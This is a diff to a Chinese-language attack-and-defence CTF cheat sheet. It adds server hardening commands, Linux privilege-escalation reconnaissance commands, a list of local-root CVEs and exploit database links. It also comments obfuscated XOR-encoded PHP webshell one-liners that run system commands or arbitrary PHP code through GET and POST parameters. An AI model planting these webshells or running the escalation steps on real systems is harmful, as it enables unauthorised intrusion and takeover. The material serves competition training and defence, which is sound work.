@@ -87,9 +87,24 @@ mysql –u username –p password database < from.sql
 
 ### 2.5# 防守常用命令
 
+#### 2.5.0# 设置只读权限
+
+Web根目录设置只读权限
+
+```C
+chmod 0555 /var/www/html
+```
+
+改变文件的属主和属组来设置严格的权限
+
+```C
+chown -R root:root /var/www/html/        //设置拥有人为：root:root 或 httpd:httpd (推荐)
+chown -R apache:apache /var/www/html/    //确保 apache 拥有 /var/www/html/
+```
+
 #### 2.5.1# 明确机器信息
 
-虽然信息收集都是红队干的活，但是蓝队也需要明确自己的信息
+知己知彼，百战不殆
 
 ```C
 uname -a                       //系统信息
@@ -231,7 +246,7 @@ service php-fpm restart
 ps -ef / px -aux
 ```
 
-注意www-data权限的/bin/sh，很有可能是nc
+注意 `www-data` 权限的 `/bin/sh`，很有可能是nc
 
 再就是上老一套命令
 
@@ -241,7 +256,7 @@ kill ps -aux | grep www-data | grep apache2 | awk '{print $2}'
 
 #### 2.5.12# 设置WAF
 
-利用.htaccess配置文件禁止php文件执行
+利用 `.htaccess` 配置文件禁止php文件执行
 
 ```php
 <Directory "/var/www/html/upload">   //指定目录后续的指令将应用于该目录
@@ -271,14 +286,59 @@ deny from all
 
 ### 3.2# Linux提权
 
-查询系统信息命令：
+查询系统版本信息命令：
 
+```c
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release
+cat /etc/redhat-release
 ```
+
+查询内核版本信息命令：
+
+```c
 uname -a
+uname -mrs
 cat /proc/version
 cat /etc/issue
 lsb_release -a
-hostnamectl
+hostnamectl  
+rpm -q kernel
+dmesg | grep Linux
+ls /boot | grep vmlinuz
+```
+
+查看系统环境变量命令：
+
+```c
+cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+```
+
+查看语言环境信息命令：
+
+```c
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc
+set
+```
+
+查看文件上传环境信息命令：
+
+```c
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
 ```
 
 这里列举一些可用利用的提权漏洞：
@@ -290,7 +350,7 @@ hostnamectl
 - CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）
 - CVE-2017-1000367（sudo本地提权漏洞 ）
 - CVE-2016-1247（Nginx权限提升漏洞）
-- CVE-2017-16995(Ubuntu16.04   kernel:4.14-4.4)
+- CVE-2017-16995（Ubuntu16.04   kernel:4.14-4.4）
 
 Kali命令查询：
 
@@ -299,7 +359,13 @@ searchsploit CentOS 7
 searchsploit Ubuntu 16.04
 ```
 
-[https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main)
+提权Exploit寻找：
+
+- [http://www.exploit-db.com](http://www.exploit-db.com)
+- [http://metasploit.com/modules/](http://metasploit.com/modules/)
+- [http://securityreason.com](http://securityreason.com)
+- [http://seclists.org/fulldisclosure/](http://seclists.org/fulldisclosure/)
+- [https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main)
 
 编译提权Exp
 
@@ -502,8 +568,8 @@ get型木马
 免杀马制作：[https://github.com/AabyssZG/WebShell-Bypass-Guide](https://github.com/AabyssZG/WebShell-Bypass-Guide)
 
 ```php
-<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);
-<?=~$_='$<>/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);
+<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);                            //执行GET传参 ?_=system&__=whoami 来执行whoami命令
+<?=~$_='$<>/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);   //执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell
 ```
 
 #### 3.7.6# 不死马
